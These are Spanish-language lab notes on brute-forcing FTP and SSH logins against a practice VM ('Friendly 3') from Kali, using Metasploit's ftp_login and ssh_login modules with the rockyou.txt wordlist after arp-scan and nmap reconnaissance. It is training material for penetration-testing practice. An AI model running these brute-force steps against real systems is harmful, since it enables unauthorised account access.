- Maquinas que vamos a usas **Kali Linux** y **Friendly 3**.

  

Vamos a ver como utilizar Metasploit para hacer ataques de fuerza bruta contra el protocolo SSH como contra FTP.

Vamos a hacer arc-scan para identificar el maquina victima en nuestra red.

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 24.png|image 24.png]]

  

```Bash
nmap -p- -sS -sV -sC -min-rate 5000 -n -vvv -Pn 10.0.3.8
```

![[Imagenes/image 1 13.png|image 1 13.png]]

  

- Vamos a empezar por el puerto 21 que corre el protocolo FTP sabiendo el nombre de usuario.
    - Lanzamos el Metasploit y hacemos la siguiente búsqueda.
        
        `search ftp_login`
        
        ![[Imagenes/image 2 12.png|image 2 12.png]]
        
        Este modulo sirve para autentificarnos en FTP pero también nos permite hace fuerza bruta.
        
          
        
    - Usamos el Modulo
        
        `use 0`
        
        ![[Imagenes/image 3 11.png|image 3 11.png]]
        
          
        
        También podríamos hacer un use copiando el nombre del modulo.
        
        `use auxiliary/scanner/ftp/ftp_login`
        
        ![[Imagenes/image 4 10.png|image 4 10.png]]
        
          
        
    - Miramos las opciones
        
        `show options`
        
        ![[Imagenes/image 5 9.png|image 5 9.png]]
        
          
        
        Solo vamos a configurar dos opciones:
        
        - **PASS_FILE** que es el diccionario de contraseñas
        - **USERNAME** es el nombre de usuario que conocemos
        - **RHOST** es la IP de la maquina opjetivo
        
          
        
    - Vamos a cargar el diccionario **rockyou.txt**
        
        `set PASS_FILE /usr/share/wordlists/rockyou.txt`
        
        `show options`
        
        ![[Imagenes/image 6 8.png|image 6 8.png]]
        

- Introducimos el nombre del usuario que ya conocemos.
    
    `set USERNAME juan`
    
    `set RHOST 10.0.3.8`
    
    `show options`
    
    ![[Imagenes/image 7 7.png|image 7 7.png]]
    

- Lanzamos el ataque
    
    `run`
    
    ![[Imagenes/image 8 6.png|image 8 6.png]]
    

  

- Vamos a por el puerto 22 que corre el protocolo SSH sabiendo el nombre de usuario.
    
    - hacemos la siguiente búsqueda
        
        `search ssh_login`
        
        ![[Imagenes/image 9 6.png|image 9 6.png]]
        
    
      
    
    - Utilizaremos el primero
        
        `use 0`
        
        `show options`
        
        ![[Imagenes/image 10 6.png|image 10 6.png]]
        
          
        
    - Seria todo idéntico a lo que hemos hecho con FTP
        
        `set USERNAME juan`
        
        `set PASS_FILE /usr/share/wordlists/rockyou.txt`
        
        `set RHOST 10.0.3.8`
        
        `show options`
        
        ![[Imagenes/image 11 5.png|image 11 5.png]]
        

- Ejecutamos el ataque
    
    `run`
    
    ![[Imagenes/image 12 5.png|image 12 5.png]]
    

- Lo probamos. abrimos un terminal nuevo.
    
    ```Bash
    ssh juan@10.0.3.8
    ```
    
    ![[Imagenes/image 13 5.png|image 13 5.png]]
    

  

**NOTA: apara hacer ataques de fuerza bruta Hydra es mucho mas rápido.**